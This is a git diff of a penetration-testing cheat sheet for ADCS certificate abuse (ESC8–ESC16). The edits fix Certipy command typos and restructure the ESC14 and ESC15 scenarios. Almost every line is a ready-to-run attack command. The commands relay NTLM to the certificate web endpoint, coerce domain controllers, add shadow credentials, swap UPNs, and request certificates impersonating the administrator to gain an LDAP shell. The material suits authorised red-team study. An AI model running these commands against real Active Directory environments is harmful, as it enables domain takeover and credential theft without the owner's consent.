@@ -6,12 +6,13 @@
 - [ESC8](#esc8)
 - [ESC9](#esc9)
 - [ESC13](#esc13)
-- [ESC14 - Scenario B](#esc14---scenario-b)
+- [ESC14](#esc14)
 - [ESC15](#esc15)
 - [ESC16](#esc16)
 
 # Installation
 https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
+**Using pip**
 ```
 sudo apt update && sudo apt install -y python3 python3-pip
 python3 -m venv certipy-venv
@@ -121,7 +122,7 @@ ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --templa
 coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
 ```
 ```
-certipy- auth -pfx administrator.pfx
+certipy auth -pfx administrator.pfx
 ```
 ## ESC9
 ```
@@ -131,7 +132,7 @@ certipy shadow auto -u username@domain -hashes :hash -account target_username
 certipy account update -u username@domain -hashes :hash -user target_username -upn administrator
 ```
 ```
-certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
+certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target dc_ip
 ```
 ```
 certipy account update -u username@domain -hashes :hash -user target_username -upn target_username
@@ -144,9 +145,10 @@ certipy auth -pfx administrator.pfx -domain domain
 certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
 ```
 ```
-python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
+certipy auth -pfx file.pfx -dc-ip ip
 ```
-## ESC14 - Scenario B
+## ESC14
+### Scenario B
 https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82
 ```
 bloodyAD --host dc -d domain -u username -p password set object target altSecurityIdentities -v 'X509:<RFC822>target@domain'
@@ -167,7 +169,14 @@ certipy account update -u owned_user -p password -user username -upn username@do
 certipy auth -pfx pfx -dc-ip ip -user target -domain domain
 ```
 ## ESC15
-Method 1
+### Scenario A
+```
+certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
+```
+```
+certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell
+```
+### Scenario B
 ```
 certipy req -u username@domain -p password -dc-ip ip -ca ca -template WebServer -application-policies 'Certificate Request Agent'
 ```
@@ -176,13 +185,6 @@ certipy req -u username@domain -p password -dc-ip ip -ca ca -template User -pfx 
 ```
 ```
 certipy auth -pfx administrator.pfx -dc-ip ip
-```
-Method 2
-```
-certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
-```
-```
-certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell
 ```
 ## ESC16
 We use a user that has GenericAll or GenericWrite
